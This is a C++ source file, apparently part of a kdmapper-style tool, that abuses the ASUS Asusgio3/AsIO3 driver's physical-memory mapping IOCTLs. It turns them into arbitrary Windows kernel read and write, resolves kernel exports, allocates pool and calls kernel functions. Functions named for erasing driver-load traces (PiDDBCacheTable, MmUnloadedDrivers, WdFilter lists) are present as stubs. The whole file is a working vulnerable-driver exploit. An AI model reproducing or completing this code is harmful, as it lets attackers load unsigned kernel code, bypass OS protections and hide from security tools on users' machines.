#include "include/asusgio3_driver.hpp"
#include "include/nt.hpp"
#include <Windows.h>
#include <winternl.h>
#include <memory>
#include <map>
#include <iostream>

HANDLE asusgio3_driver::hDevice = INVALID_HANDLE_VALUE;
ULONG64 asusgio3_driver::ntoskrnlAddr = 0;
ULONG64 asusgio3_driver::physToVirtOffset = 0;
bool asusgio3_driver::offsetInitialized = false;

// Track mapped regions for cleanup
static std::map<uint64_t, std::tuple<uint64_t, uint64_t, uint64_t>> mapped_regions; // virt_addr -> (size, section_handle, object_ref)

bool asusgio3_driver::IsRunning() {
	// Try different possible device names with different access modes
	const wchar_t* device_names[] = {
		L"\\\\.\\Asusgio3",
		L"\\\\.\\AsIO3",
		L"\\\\.\\AsIO"
	};
	
	// Try different access combinations
	DWORD access_modes[] = {
		GENERIC_READ | GENERIC_WRITE,
		GENERIC_READ,
		FILE_READ_DATA | FILE_WRITE_DATA
	};
	
	for (int i = 0; i < sizeof(device_names) / sizeof(device_names[0]); i++) {
		for (int j = 0; j < sizeof(access_modes) / sizeof(access_modes[0]); j++) {
			HANDLE h = CreateFileW(device_names[i], access_modes[j], FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			if (h != INVALID_HANDLE_VALUE) {
				CloseHandle(h);
				return true;
			}
			DWORD err = GetLastError();
			if (err != ERROR_FILE_NOT_FOUND && err != ERROR_PATH_NOT_FOUND) {
				// Device exists but access denied - this is the issue
				kdmLog(L"[!] Device " << device_names[i] << L" exists but access denied (error " << err << L")" << std::endl);
			}
		}
	}
	return false;
}

bool asusgio3_driver::OpenDevice() {
	if (hDevice != INVALID_HANDLE_VALUE)
		return true;

	// Enable SeDebugPrivilege - might be needed for device access
	HMODULE ntdll = GetModuleHandleA("ntdll.dll");
	if (ntdll) {
		ULONG SE_DEBUG_PRIVILEGE = 20UL;
		BOOLEAN WasEnabled;
		nt::RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &WasEnabled);
	}

	// Try using NtCreateFile for direct device access
	typedef NTSTATUS (WINAPI *pNtCreateFile)(
		PHANDLE FileHandle,
		ACCESS_MASK DesiredAccess,
		POBJECT_ATTRIBUTES ObjectAttributes,
		PIO_STATUS_BLOCK IoStatusBlock,
		PLARGE_INTEGER AllocationSize,
		ULONG FileAttributes,
		ULONG ShareAccess,
		ULONG CreateDisposition,
		ULONG CreateOptions,
		PVOID EaBuffer,
		ULONG EaLength
	);
	
	pNtCreateFile NtCreateFile = (pNtCreateFile)GetProcAddress(ntdll, "NtCreateFile");
	
	// Try \Device\Asusgio3 directly (kernel device name)
	if (NtCreateFile) {
		UNICODE_STRING devicePath;
		RtlInitUnicodeString(&devicePath, L"\\Device\\Asusgio3");
		
		OBJECT_ATTRIBUTES objAttr;
		InitializeObjectAttributes(&objAttr, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
		
		IO_STATUS_BLOCK ioStatus = {0};
		HANDLE ntHandle = NULL;
		
		NTSTATUS status = NtCreateFile(
			&ntHandle,
			FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
			&objAttr,
			&ioStatus,
			NULL,
			FILE_ATTRIBUTE_NORMAL,
			FILE_SHARE_READ | FILE_SHARE_WRITE,
			FILE_OPEN,
			FILE_SYNCHRONOUS_IO_NONALERT,
			NULL,
			0
		);
		
		if (NT_SUCCESS(status) && ntHandle != NULL) {
			hDevice = ntHandle;
			kdmLog(L"[+] Opened device using NtCreateFile (\\Device\\Asusgio3)" << std::endl);
		} else {
			// Try DosDevices path
			RtlInitUnicodeString(&devicePath, L"\\DosDevices\\Asusgio3");
			InitializeObjectAttributes(&objAttr, &devicePath, OBJ_CASE_INSENSITIVE, NULL, NULL);
			status = NtCreateFile(
				&ntHandle,
				FILE_READ_DATA | FILE_WRITE_DATA | SYNCHRONIZE,
				&objAttr,
				&ioStatus,
				NULL,
				FILE_ATTRIBUTE_NORMAL,
				FILE_SHARE_READ | FILE_SHARE_WRITE,
				FILE_OPEN,
				FILE_SYNCHRONOUS_IO_NONALERT,
				NULL,
				0
			);
			if (NT_SUCCESS(status) && ntHandle != NULL) {
				hDevice = ntHandle;
				kdmLog(L"[+] Opened device using NtCreateFile (\\DosDevices\\Asusgio3)" << std::endl);
			}
		}
	}
	
	// Fallback to CreateFileW with different names if NtCreateFile failed
	if (hDevice == INVALID_HANDLE_VALUE) {
		const wchar_t* device_names[] = {
			L"\\\\.\\Asusgio3",
			L"\\\\.\\AsIO3",
			L"\\\\.\\AsIO"
		};
		
		for (int i = 0; i < sizeof(device_names) / sizeof(device_names[0]); i++) {
			hDevice = CreateFileW(device_names[i], GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
			if (hDevice != INVALID_HANDLE_VALUE) {
				kdmLog(L"[+] Opened device: " << device_names[i] << std::endl);
				break;
			}
		}
	}
	
	if (hDevice == INVALID_HANDLE_VALUE) {
		DWORD err = GetLastError();
		// Output to console directly since kdmLog might be disabled
		std::wcout << L"[-] Failed to open Asusgio3 device. Error code: " << err << std::endl;
		if (err == ERROR_ACCESS_DENIED) {
			std::wcout << L"[!] Access denied - device exists but security descriptor blocks access" << std::endl;
			std::wcout << L"[!] This driver may not be accessible from user mode" << std::endl;
		} else if (err == ERROR_FILE_NOT_FOUND || err == ERROR_PATH_NOT_FOUND) {
			std::wcout << L"[!] Device not found - symbolic link may not exist" << std::endl;
		} else {
			std::wcout << L"[!] Unknown error - device may not be created yet" << std::endl;
		}
		kdmLog(L"[-] Failed to open Asusgio3 device. Error: " << err << std::endl);
		kdmLog(L"[*] Driver service is running but device is not accessible" << std::endl);
		return false;
	}

	ntoskrnlAddr = kdmUtils::GetKernelModuleAddress("ntoskrnl.exe");
	if (ntoskrnlAddr == 0) {
		kdmLog(L"[-] Failed to get ntoskrnl.exe address" << std::endl);
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
		return false;
	}

	kdmLog(L"[+] Asusgio3 device opened. ntoskrnl at 0x" << std::hex << ntoskrnlAddr << std::endl);
	
	// Test if the physical memory mapping works
	kdmLog(L"[*] Testing physical memory map at 0x1000..." << std::endl);
	uint64_t test_mapped = MapPhysicalMemory(0x1000, 0x1000);
	if (!test_mapped) {
		kdmLog(L"[-] Physical memory mapping failed! Error: " << GetLastError() << std::endl);
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
		return false;
	}
	kdmLog(L"[+] Physical memory mapping works! Mapped at 0x" << std::hex << test_mapped << std::endl);
	
	// Unmap test
	auto it = mapped_regions.find(test_mapped);
	if (it != mapped_regions.end()) {
		UnmapPhysicalMemory(test_mapped, std::get<1>(it->second), std::get<2>(it->second));
		mapped_regions.erase(it);
	}
	
	return true;
}

void asusgio3_driver::CloseDevice() {
	// Unmap all regions
	for (auto it = mapped_regions.begin(); it != mapped_regions.end(); ++it) {
		UnmapPhysicalMemory(it->first, std::get<1>(it->second), std::get<2>(it->second));
	}
	mapped_regions.clear();

	if (hDevice != INVALID_HANDLE_VALUE) {
		CloseHandle(hDevice);
		hDevice = INVALID_HANDLE_VALUE;
	}
}

// Map physical memory to virtual address
uint64_t asusgio3_driver::MapPhysicalMemory(uint64_t phys_addr, uint64_t size) {
	if (hDevice == INVALID_HANDLE_VALUE)
		return 0;

	// Safety check
	if (phys_addr == 0 || phys_addr < 0x1000)
		return 0;

	MAP_PHYS_REQUEST request = {};
	request.PhysicalAddress = phys_addr;
	request.Size = size;
	request.VirtualAddress = 0;
	request.SectionHandle = 0;
	request.ObjectReference = 0;

	DWORD bytesReturned = 0;
	if (!DeviceIoControl(hDevice, IOCTL_MAP_PHYS, &request, sizeof(request), &request, sizeof(request), &bytesReturned, nullptr)) {
		return 0;
	}

	if (request.VirtualAddress == 0)
		return 0;

	// Store mapping info for cleanup
	mapped_regions[request.VirtualAddress] = std::make_tuple(size, request.SectionHandle, request.ObjectReference);

	return request.VirtualAddress;
}

// Unmap physical memory
bool asusgio3_driver::UnmapPhysicalMemory(uint64_t virtual_addr, uint64_t section_handle, uint64_t object_ref) {
	if (hDevice == INVALID_HANDLE_VALUE)
		return false;

	// For 64-bit process, IOCTL 0xa0402450 expects 4 bytes (virtual address as uint32_t*)
	// But we need to pass the full 8-byte address. Looking at Ghidra, it uses *puVar4 which is uint*
	// For 64-bit: if uVar28 == 4, calls ZwUnmapViewOfSection(0xffffffffffffffff, *puVar4)
	// So it reads 4 bytes from the buffer, but we need to pass 8 bytes for the full address
	// Actually, let's try passing 8 bytes - the driver might handle it
	uint64_t virt_addr = virtual_addr;
	DWORD bytesReturned = 0;
	// Try 8 bytes first (full address)
	if (DeviceIoControl(hDevice, IOCTL_UNMAP_PHYS, &virt_addr, sizeof(virt_addr), nullptr, 0, &bytesReturned, nullptr))
		return true;
	// If that fails, try 4 bytes (lower 32 bits)
	uint32_t virt_addr_low = (uint32_t)virtual_addr;
	return DeviceIoControl(hDevice, IOCTL_UNMAP_PHYS, &virt_addr_low, sizeof(virt_addr_low), nullptr, 0, &bytesReturned, nullptr) != FALSE;
}

// Read from physical memory
bool asusgio3_driver::ReadPhysicalMemory(uint64_t phys_addr, void* buffer, size_t size) {
	if (!buffer || !size)
		return false;

	// Map the physical memory
	uint64_t mapped = MapPhysicalMemory(phys_addr, size);
	if (!mapped)
		return false;

	// Copy from mapped memory
	__try {
		memcpy(buffer, (void*)mapped, size);
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
		auto it = mapped_regions.find(mapped);
		if (it != mapped_regions.end()) {
			UnmapPhysicalMemory(mapped, std::get<1>(it->second), std::get<2>(it->second));
			mapped_regions.erase(it);
		}
		return false;
	}

	// Unmap
	auto it = mapped_regions.find(mapped);
	if (it != mapped_regions.end()) {
		UnmapPhysicalMemory(mapped, std::get<1>(it->second), std::get<2>(it->second));
		mapped_regions.erase(it);
	}

	return true;
}

// Write to physical memory
bool asusgio3_driver::WritePhysicalMemory(uint64_t phys_addr, void* buffer, size_t size) {
	if (!buffer || !size)
		return false;

	// Map the physical memory
	uint64_t mapped = MapPhysicalMemory(phys_addr, size);
	if (!mapped)
		return false;

	// Copy to mapped memory
	__try {
		memcpy((void*)mapped, buffer, size);
	}
	__except(EXCEPTION_EXECUTE_HANDLER) {
		auto it = mapped_regions.find(mapped);
		if (it != mapped_regions.end()) {
			UnmapPhysicalMemory(mapped, std::get<1>(it->second), std::get<2>(it->second));
			mapped_regions.erase(it);
		}
		return false;
	}

	// Unmap
	auto it = mapped_regions.find(mapped);
	if (it != mapped_regions.end()) {
		UnmapPhysicalMemory(mapped, std::get<1>(it->second), std::get<2>(it->second));
		mapped_regions.erase(it);
	}

	return true;
}

// Check if a physical address contains ntoskrnl
static bool CheckForNtoskrnl(uint64_t phys, uint64_t ntoskrnl_virt, uint64_t* out_offset) {
	uint32_t header = 0;
	if (!asusgio3_driver::ReadPhysicalMemory(phys, &header, sizeof(header)))
		return false;

	// Check for MZ header
	if ((header & 0xFFFF) != 0x5A4D)
		return false;

	// Read PE offset
	uint32_t pe_offset = 0;
	if (!asusgio3_driver::ReadPhysicalMemory(phys + 0x3C, &pe_offset, sizeof(pe_offset)))
		return false;

	if (pe_offset > 0x400 || pe_offset < 0x40)
		return false;

	// Check PE signature
	uint32_t pe_sig = 0;
	if (!asusgio3_driver::ReadPhysicalMemory(phys + pe_offset, &pe_sig, sizeof(pe_sig)))
		return false;

	if (pe_sig != 0x00004550)  // "PE\0\0"
		return false;

	// Check SizeOfImage - ntoskrnl is typically 10MB+
	uint32_t size_of_image = 0;
	if (!asusgio3_driver::ReadPhysicalMemory(phys + pe_offset + 0x50, &size_of_image, sizeof(size_of_image)))
		return false;

	if (size_of_image >= 0x800000) {  // At least 8MB
		*out_offset = ntoskrnl_virt - phys;
		return true;
	}

	return false;
}

// Initialize the virtual-to-physical offset by checking known locations
bool asusgio3_driver::InitializePhysicalOffset() {
	if (offsetInitialized)
		return true;

	kdmLog(L"[*] Looking for ntoskrnl in physical memory..." << std::endl);

	// Common physical addresses where ntoskrnl is loaded on Windows 10/11
	// These are 2MB-aligned because kernel uses large pages
	const uint64_t common_locations[] = {
		0x00200000,  // 2MB - very common
		0x01000000,  // 16MB
		0x02000000,  // 32MB
		0x00400000,  // 4MB
		0x00600000,  // 6MB
		0x00800000,  // 8MB
		0x00A00000,  // 10MB
		0x00C00000,  // 12MB
		0x00E00000,  // 14MB
		0x01200000,  // 18MB
		0x01400000,  // 20MB
		0x01600000,  // 22MB
		0x01800000,  // 24MB
		0x01A00000,  // 26MB
		0x01C00000,  // 28MB
		0x01E00000,  // 30MB
	};

	// Try common locations first (fast path)
	for (uint64_t phys : common_locations) {
		kdmLog(L"[*] Trying 0x" << std::hex << phys << L"..." << std::endl);
		if (CheckForNtoskrnl(phys, ntoskrnlAddr, &physToVirtOffset)) {
			offsetInitialized = true;
			kdmLog(L"[+] Found ntoskrnl at physical 0x" << std::hex << phys << std::endl);
			return true;
		}
	}

	// If common locations fail, do a limited scan of 2MB-aligned addresses
	kdmLog(L"[*] Common locations failed, scanning 2MB boundaries..." << std::endl);
	for (uint64_t phys = 0x200000; phys < 0x10000000; phys += 0x200000) {
		// Skip addresses we already tried
		bool already_tried = false;
		for (uint64_t loc : common_locations) {
			if (loc == phys) { already_tried = true; break; }
		}
		if (already_tried) continue;

		if (CheckForNtoskrnl(phys, ntoskrnlAddr, &physToVirtOffset)) {
			offsetInitialized = true;
			kdmLog(L"[+] Found ntoskrnl at physical 0x" << std::hex << phys << std::endl);
			return true;
		}
	}

	kdmLog(L"[-] Failed to find ntoskrnl" << std::endl);
	return false;
}

bool asusgio3_driver::GetPhysicalAddress(uint64_t virt_addr, uint64_t* out_phys_addr) {
	if (!virt_addr || !out_phys_addr)
		return false;

	if (!InitializePhysicalOffset())
		return false;

	// Only works for kernel addresses
	if (virt_addr < 0xFFFF800000000000ULL)
		return false;

	*out_phys_addr = virt_addr - physToVirtOffset;
	return true;
}

bool asusgio3_driver::ReadKernelMemory(uint64_t address, void* buffer, size_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t phys_addr = 0;
	if (!GetPhysicalAddress(address, &phys_addr))
		return false;

	return ReadPhysicalMemory(phys_addr, buffer, size);
}

bool asusgio3_driver::WriteKernelMemory(uint64_t address, void* buffer, size_t size) {
	if (!address || !buffer || !size)
		return false;

	uint64_t phys_addr = 0;
	if (!GetPhysicalAddress(address, &phys_addr))
		return false;

	return WritePhysicalMemory(phys_addr, buffer, size);
}

bool asusgio3_driver::MemCopy(uint64_t dest, uint64_t src, uint64_t size) {
	if (!dest || !src || !size)
		return false;

	auto buffer = std::make_unique<uint8_t[]>(size);
	if (!ReadKernelMemory(src, buffer.get(), size))
		return false;

	return WriteKernelMemory(dest, buffer.get(), size);
}

bool asusgio3_driver::SetMemory(uint64_t address, uint32_t value, uint64_t size) {
	if (!address || !size)
		return false;

	auto buffer = std::make_unique<uint8_t[]>(size);
	memset(buffer.get(), (uint8_t)value, size);
	return WriteKernelMemory(address, buffer.get(), size);
}

uint64_t asusgio3_driver::GetKernelModuleExport(uint64_t kernel_module_base, const std::string& function_name) {
	if (!kernel_module_base)
		return 0;

	IMAGE_DOS_HEADER dos_header = { 0 };
	IMAGE_NT_HEADERS64 nt_headers = { 0 };

	if (!ReadKernelMemory(kernel_module_base, &dos_header, sizeof(dos_header)) || dos_header.e_magic != IMAGE_DOS_SIGNATURE)
		return 0;
	
	if (!ReadKernelMemory(kernel_module_base + dos_header.e_lfanew, &nt_headers, sizeof(nt_headers)) || nt_headers.Signature != IMAGE_NT_SIGNATURE)
		return 0;

	const auto export_base = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
	const auto export_base_size = nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

	if (!export_base || !export_base_size)
		return 0;

	const auto export_data = reinterpret_cast<PIMAGE_EXPORT_DIRECTORY>(VirtualAlloc(nullptr, export_base_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE));
	if (!export_data)
		return 0;

	if (!ReadKernelMemory(kernel_module_base + export_base, export_data, export_base_size)) {
		VirtualFree(export_data, 0, MEM_RELEASE);
		return 0;
	}

	const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;
	const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
	const auto ordinal_table = reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
	const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

	for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
		const std::string current_function_name = std::string(reinterpret_cast<char*>(name_table[i] + delta));

		if (!_stricmp(current_function_name.c_str(), function_name.c_str())) {
			const auto function_ordinal = ordinal_table[i];
			if (function_table[function_ordinal] <= 0x1000) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}
			const auto function_address = kernel_module_base + function_table[function_ordinal];

			// Check for forwarded export
			if (function_address >= kernel_module_base + export_base && 
			    function_address <= kernel_module_base + export_base + export_base_size) {
				VirtualFree(export_data, 0, MEM_RELEASE);
				return 0;
			}

			VirtualFree(export_data, 0, MEM_RELEASE);
			return function_address;
		}
	}

	VirtualFree(export_data, 0, MEM_RELEASE);
	return 0;
}

uint64_t asusgio3_driver::AllocatePool(nt::POOL_TYPE pool_type, uint64_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_ExAllocatePoolWithTag = 0;
	if (!kernel_ExAllocatePoolWithTag) {
		kernel_ExAllocatePoolWithTag = GetKernelModuleExport(ntoskrnlAddr, "ExAllocatePoolWithTag");
		if (!kernel_ExAllocatePoolWithTag) {
			kdmLog(L"[-] Failed to get ExAllocatePoolWithTag" << std::endl);
			return 0;
		}
	}

	uint64_t allocated_pool = 0;
	if (!CallKernelFunction(&allocated_pool, kernel_ExAllocatePoolWithTag, pool_type, size, 'kdmM'))
		return 0;

	return allocated_pool;
}

bool asusgio3_driver::FreePool(uint64_t address) {
	if (!address)
		return false;

	static uint64_t kernel_ExFreePool = 0;
	if (!kernel_ExFreePool) {
		kernel_ExFreePool = GetKernelModuleExport(ntoskrnlAddr, "ExFreePool");
		if (!kernel_ExFreePool)
			return false;
	}

	return CallKernelFunction<void>(nullptr, kernel_ExFreePool, address);
}

uint64_t asusgio3_driver::MmAllocateIndependentPagesEx(uint32_t size) {
	if (!size)
		return 0;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmAllocateIndependentPagesEx");
	if (!kernel_func) {
		kdmLog(L"[!] MmAllocateIndependentPagesEx not found, using pool" << std::endl);
		return AllocatePool(nt::POOL_TYPE::NonPagedPool, size);
	}

	uint64_t allocated = 0;
	if (!CallKernelFunction(&allocated, kernel_func, size, 0ull))
		return 0;

	return allocated;
}

bool asusgio3_driver::MmFreeIndependentPages(uint64_t address, uint32_t size) {
	if (!address)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmFreeIndependentPages");
	if (!kernel_func)
		return FreePool(address);

	return CallKernelFunction<void>(nullptr, kernel_func, address, size);
}

BOOLEAN asusgio3_driver::MmSetPageProtection(uint64_t address, uint32_t size, ULONG new_protect) {
	if (!address || !size)
		return FALSE;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "MmSetPageProtection");
	if (!kernel_func)
		return TRUE;  // Not critical

	BOOLEAN result = FALSE;
	CallKernelFunction(&result, kernel_func, address, size, new_protect);
	return result;
}

PVOID asusgio3_driver::ResolveRelativeAddress(_In_ PVOID Instruction, _In_ ULONG OffsetOffset, _In_ ULONG InstructionSize) {
	ULONG_PTR Instr = (ULONG_PTR)Instruction;
	LONG RipOffset = 0;
	if (!ReadKernelMemory(Instr + OffsetOffset, &RipOffset, sizeof(LONG)))
		return nullptr;
	return (PVOID)(Instr + InstructionSize + RipOffset);
}

uintptr_t asusgio3_driver::FindPatternAtKernel(uintptr_t dwAddress, uintptr_t dwLen, BYTE* bMask, const char* szMask) {
	if (!dwAddress || dwLen > 1024 * 1024 * 1024)
		return 0;

	auto sectionData = std::make_unique<BYTE[]>(dwLen);
	if (!ReadKernelMemory(dwAddress, sectionData.get(), dwLen))
		return 0;

	auto result = kdmUtils::FindPattern((uintptr_t)sectionData.get(), dwLen, bMask, szMask);
	if (result <= 0)
		return 0;

	return dwAddress - (uintptr_t)sectionData.get() + result;
}

uintptr_t asusgio3_driver::FindSectionAtKernel(const char* sectionName, uintptr_t modulePtr, PULONG size) {
	if (!modulePtr)
		return 0;

	BYTE headers[0x1000];
	if (!ReadKernelMemory(modulePtr, headers, 0x1000))
		return 0;

	ULONG sectionSize = 0;
	uintptr_t section = (uintptr_t)kdmUtils::FindSection(sectionName, (uintptr_t)headers, &sectionSize);
	if (!section || !sectionSize)
		return 0;

	if (size)
		*size = sectionSize;

	return section - (uintptr_t)headers + modulePtr;
}

uintptr_t asusgio3_driver::FindPatternInSectionAtKernel(const char* sectionName, uintptr_t modulePtr, BYTE* bMask, const char* szMask) {
	ULONG sectionSize = 0;
	uintptr_t section = FindSectionAtKernel(sectionName, modulePtr, &sectionSize);
	return FindPatternAtKernel(section, sectionSize, bMask, szMask);
}

bool asusgio3_driver::ExAcquireResourceExclusiveLite(PVOID Resource, BOOLEAN wait) {
	if (!Resource)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "ExAcquireResourceExclusiveLite");
	if (!kernel_func)
		return false;

	BOOLEAN out;
	return CallKernelFunction(&out, kernel_func, Resource, wait) && out;
}

bool asusgio3_driver::ExReleaseResourceLite(PVOID Resource) {
	if (!Resource)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "ExReleaseResourceLite");
	if (!kernel_func)
		return false;

	return CallKernelFunction<void>(nullptr, kernel_func, Resource);
}

BOOLEAN asusgio3_driver::RtlDeleteElementGenericTableAvl(PVOID Table, PVOID Buffer) {
	if (!Table)
		return false;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "RtlDeleteElementGenericTableAvl");
	if (!kernel_func)
		return false;

	bool out;
	return CallKernelFunction(&out, kernel_func, Table, Buffer) && out;
}

PVOID asusgio3_driver::RtlLookupElementGenericTableAvl(nt::PRTL_AVL_TABLE Table, PVOID Buffer) {
	if (!Table)
		return nullptr;

	static uint64_t kernel_func = GetKernelModuleExport(ntoskrnlAddr, "RtlLookupElementGenericTableAvl");
	if (!kernel_func)
		return nullptr;

	PVOID out;
	if (!CallKernelFunction(&out, kernel_func, Table, Buffer))
		return nullptr;

	return out;
}

nt::PiDDBCacheEntry* asusgio3_driver::LookupEntry(nt::PRTL_AVL_TABLE PiDDBCacheTable, ULONG timestamp, const wchar_t* name) {
	nt::PiDDBCacheEntry localentry{};
	localentry.TimeDateStamp = timestamp;
	localentry.DriverName.Buffer = (PWSTR)name;
	localentry.DriverName.Length = (USHORT)(wcslen(name) * 2);
	localentry.DriverName.MaximumLength = localentry.DriverName.Length + 2;
	return (nt::PiDDBCacheEntry*)RtlLookupElementGenericTableAvl(PiDDBCacheTable, (PVOID)&localentry);
}

bool asusgio3_driver::ClearPiDDBCacheTable() {
	kdmLog(L"[!] ClearPiDDBCacheTable: skipped" << std::endl);
	return true;
}

bool asusgio3_driver::ClearKernelHashBucketList() {
	kdmLog(L"[!] ClearKernelHashBucketList: skipped" << std::endl);
	return true;
}

bool asusgio3_driver::ClearMmUnloadedDrivers() {
	kdmLog(L"[!] ClearMmUnloadedDrivers: skipped" << std::endl);
	return true;
}

bool asusgio3_driver::ClearWdFilterDriverList() {
	kdmLog(L"[!] ClearWdFilterDriverList: skipped" << std::endl);
	return true;
}

